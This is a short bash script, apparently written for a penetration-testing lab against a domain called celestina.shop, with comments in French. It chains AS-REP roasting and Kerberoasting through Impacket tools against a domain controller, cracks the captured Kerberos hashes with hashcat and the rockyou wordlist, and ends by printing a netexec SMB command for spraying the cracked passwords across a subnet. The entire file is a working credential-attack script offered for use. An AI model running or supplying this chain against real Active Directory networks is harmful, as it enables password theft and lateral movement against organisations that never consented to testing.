#!/usr/bin/env bash
# AS-REP + Kerberoast + hashcat (Celestina)
set -euo pipefail

DC_IP="${DC_IP:-10.13.37.42}"
DOMAIN="${DOMAIN:-celestina.shop}"
USER="${USER:-pentester}"
PASS="${PASS:-Password123!}"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"

CREDS="$DOMAIN/$USER:$PASS"

echo "[*] AS-REP Roasting..."
GetNPUsers.py "$CREDS" -request -format hashcat -dc-ip "$DC_IP" -outputfile asrep.txt || true

if [ -s asrep.txt ]; then
  echo "[*] Hashcat AS-REP (-m 18200)..."
  hashcat -m 18200 asrep.txt "$WORDLIST" --force -o asrep_cracked.txt || true
  hashcat -m 18200 asrep.txt --show
fi

echo "[*] Kerberoasting..."
GetUserSPNs.py "$CREDS" -request -dc-ip "$DC_IP" -outputfile kerb.txt || true

if [ -s kerb.txt ]; then
  echo "[*] Hashcat Kerberoast (-m 13100)..."
  hashcat -m 13100 kerb.txt "$WORDLIST" --force -o kerb_cracked.txt || true
  hashcat -m 13100 kerb.txt --show
fi

echo "[*] Terminé. Tester les mots de passe avec:"
echo "    nxc smb 10.13.37.0/24 -u 'COMPTE' -p 'PASS' --continue-on-success"
